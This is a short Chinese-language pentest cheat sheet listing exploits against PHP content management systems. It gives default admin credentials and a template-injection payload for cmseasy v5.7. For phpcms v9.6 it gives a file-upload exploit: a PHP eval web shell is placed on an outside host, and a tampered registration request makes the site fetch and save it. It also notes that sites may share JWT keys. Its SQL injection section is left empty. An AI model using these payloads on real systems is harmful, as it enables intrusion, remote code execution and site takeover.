phpcms：
帝国cms
苹果cms
Drupal
wordpress
discuz


同一套系统的不同站点的jwt加密密钥可能相同。


^
#### **cmseasy php系统v5.7**
admin/admin
后台模板-自定义标签，使用payload，预览即可。
```
1111";}<?php phpinfo() ?>
```


^
## **phpcms v9.6**
安装路径/install/install.php
存在远程任意文件上传
```
http://xx.xx.xx.xx/1.txt存放内容如下:
<?php @eval($_POST[1]);?>
```
注册抓包改包
```
POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1

siteid=1&modelid=11&username=test452&password=test2123&email=test2154@163.com&info[content]=<img src=http://xx.xx.xx.xx/1.txt?.php#.jpg>&dosubmit=1&protocol=
```
此时会回显上传的路径


^
## **icms**
sql注入
```

```